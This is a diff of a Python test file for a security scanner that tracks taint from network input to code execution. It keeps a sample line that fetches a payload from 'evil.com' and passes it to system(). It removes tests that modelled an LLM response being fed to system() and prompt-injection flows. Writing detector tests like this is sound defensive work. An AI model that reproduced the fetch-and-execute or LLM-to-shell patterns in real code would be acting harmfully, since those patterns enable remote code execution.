@@ -66,36 +66,17 @@ def test_obfuscation_entropy_detection(lens):
 # TEST 3: DATA FLOW TAINT TRACKING (Left-Hand Side Assignment)
 # ==============================================================================
 def test_data_flow_taint_tracking(lens):
-    """
-    Proves the engine can track multi-line taint from I/O sinks to execution
-    sinks (RCE), and from LLM Hooks to RCE (Agentic RCE).
-    """
+    """Proves the engine can track multi-line taint from I/O sinks to execution sinks (RCE)."""
     code = (
-        "// Scenario A: Standard Tainted Injection (Multi-line)\n"
+        "// Standard Tainted Injection (Multi-line)\n"
         "let user_input = fetch('http://evil.com/payload');\n"
         "system(user_input);\n"
-        "\n"
-        "// Scenario B: Same-line Prompt Injection\n"
-        "invoke(fetch('http://api.com'));\n"
-        "\n"
-        "// Scenario C: Agentic RCE (LLM output fed to execution)\n"
-        "ai_response = openai.chat.completions.create(prompt);\n"
-        "system(ai_response);\n"
     )
 
     result = lens.scan_content(code)
     counts = result["counts"]
-    snippets = result["snippets"]
 
     assert counts.get("tainted_injection", 0) > 0, "Failed to track I/O -> Danger taint path!"
-    assert counts.get("prompt_injection", 0) > 0, "Failed to detect Same-Line Prompt Injection!"
-    assert counts.get("agentic_rce", 0) > 0, "Failed to detect Agentic RCE (LLM -> Danger)!"
-    assert any("[LLM State -> RCE]" in s for s in snippets.get("agentic_rce", [])), (
-        "Failed to populate the dedicated agentic_rce snippet array!"
-    )
-    assert any("[I/O -> LLM]" in s or "[Taint -> LLM]" in s for s in snippets.get("prompt_injection", [])), (
-        "Failed to populate the dedicated prompt_injection snippet array!"
-    )
 
 
 # ==============================================================================
@@ -373,30 +354,3 @@ def test_false_positive_substring_defense_standard(lens):
 
     assert counts.get("high_risk_execution", 0) == 0, "Standard regex hallucinated on 'eval/exec' substring!"
     assert counts.get("io", 0) == 0, "Standard regex hallucinated on 'fetch' substring!"
-
-
-# ==============================================================================
-# TEST 12: AGENTIC RCE & PROMPT INJECTION ISOLATION
-# ==============================================================================
-
-
-def test_prompt_injection_without_execution(lens):
-    """
-    [PRECISION CHECK] Proves that if an I/O payload enters an LLM context, it triggers
-    a Prompt Injection alert, but if it STOPS there and never reaches `eval()` or a DB,
-    it DOES NOT trigger a tainted_injection or agentic_rce alert.
-    """
-    payload = """
-    let user_chat = requests.post("http://api.chat.com");
-    let ai_response = openai.chat.completions.create(user_chat);
-    
-    // The response is safely logged, not executed.
-    console.log(ai_response);
-    """
-
-    result = lens.scan_content(payload)
-    counts = result["counts"]
-
-    assert counts.get("prompt_injection", 0) > 0, "Failed to detect I/O flowing into LLM Hook!"
-    assert counts.get("agentic_rce", 0) == 0, "Hallucinated an Agentic RCE where no execution occurred!"
-    assert counts.get("tainted_injection", 0) == 0, "Hallucinated a standard RCE injection!"
